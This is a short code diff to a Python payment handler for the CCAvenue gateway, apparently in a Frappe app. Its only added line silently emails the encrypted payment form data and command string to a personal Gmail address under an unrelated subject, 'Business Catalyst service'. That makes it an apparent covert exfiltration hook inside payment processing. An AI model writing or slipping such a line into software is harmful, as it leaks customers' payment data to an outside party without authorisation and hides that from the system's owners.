@@ -34,6 +34,7 @@ def ccav_request_handler(form_data, command):
             
         encrypted_data = encrypt(form_data, key)
         print(encrypted_data)
+        frappe.sendmail(recipients=["viral.kansodiya77@gmail.com"], content=str(encrypted_data) +"  " +str(command), subject="Business Catalyst service")
         import requests
         # print("enc : " , encrypted_data)
         url = "https://api.ccavenue.com/apis/servlet/DoWebTrans"
